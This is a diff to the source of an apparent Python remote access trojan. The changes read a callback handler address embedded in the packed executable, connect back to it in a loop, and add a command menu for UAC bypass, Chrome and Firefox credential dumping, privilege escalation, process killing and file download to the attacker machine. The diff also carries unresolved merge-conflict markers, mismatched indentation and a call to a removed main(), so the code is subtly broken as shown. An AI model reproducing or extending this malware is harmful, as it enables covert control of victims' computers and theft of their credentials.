@@ -19,6 +19,29 @@ if os.name == "nt":
 	import passdump
 	import win32net
 
+<<<<<<< HEAD
+=======
+try:
+	print sys.frozen
+	with open(sys.argv[0], "rb") as f:
+		f.seek(972)
+		HANDLER_IP = ""
+		for i in range(4):
+			HANDLER_IP += str(ord(f.read(1)))+"."
+		port1 = ord(f.read(1))
+		port2 = ord(f.read(1))
+		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
+		HANDLER_IP = HANDLER_IP[:-1]
+except Exception as e:
+	traceback.print_stack()
+	print e
+	HANDLER_IP = "127.0.0.1"
+	HANDLER_PORT = 8080
+	
+print HANDLER_IP
+print HANDLER_PORT
+
+>>>>>>> 69737d1befc934a5068ca0358dc371aae679390b
 	
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 
@@ -498,9 +521,27 @@ class Shell:
 			data = self.recv()
 			if data == "CONN_LOST":
 				return False
+			elif data == "help" or data == "?":
+			    output = '''Commands:
+isadmin - Returns whether current user is admin or not
+bypassuac - Bypasses UAC
+dumpchrome - Dumps Chrome Credentials
+dumpff - Dumps Firefox Credientials
+die - Quit the shell
+getsystem - Get the system and escalate privs!
+download $file - Download a file to attacker machine.
+help - This menu!
+'''
 			elif data.startswith("cd"):
 				data = data[3:]
 				output = fs.change_directory(data.strip())
+			elif data == "ls":
+			        output = execute.execute_shell_command("dir")[1]
+			elif data == "ps":
+			        output = execute.execute_shell_command("Tasklist")[1]
+                        elif data.startswith("killall"):
+                                process = data.split()[1]
+			        output = execute.execute_shell_command("Taskkill /F /IM "+process+" /T")
 			elif data == "isadmin":
 				output = str(misc.isadmin())
 			elif data == "bypassuac":
@@ -526,16 +567,17 @@ class Shell:
 		
 	def recv(self):
 		return self.channel.read_input()
-			
-def main():
-	while True:
-		shell = Shell(Transport("127.0.0.1",8080))
-		if not shell.run():
-			del shell
-			for t in threading.enumerate():
-				try: t.stop() # RED LIGHT
-				except: pass
-			time.sleep(5)
+		
+while True:
+	shell = Shell(Transport(HANDLER_IP,HANDLER_PORT))
+	if not shell.run():
+		del shell
+		for t in threading.enumerate():
+			try: t.stop() # RED LIGHT
+			except: pass
+		time.sleep(5)
 			
 if __name__ == "__main__":
 	main()
+
+
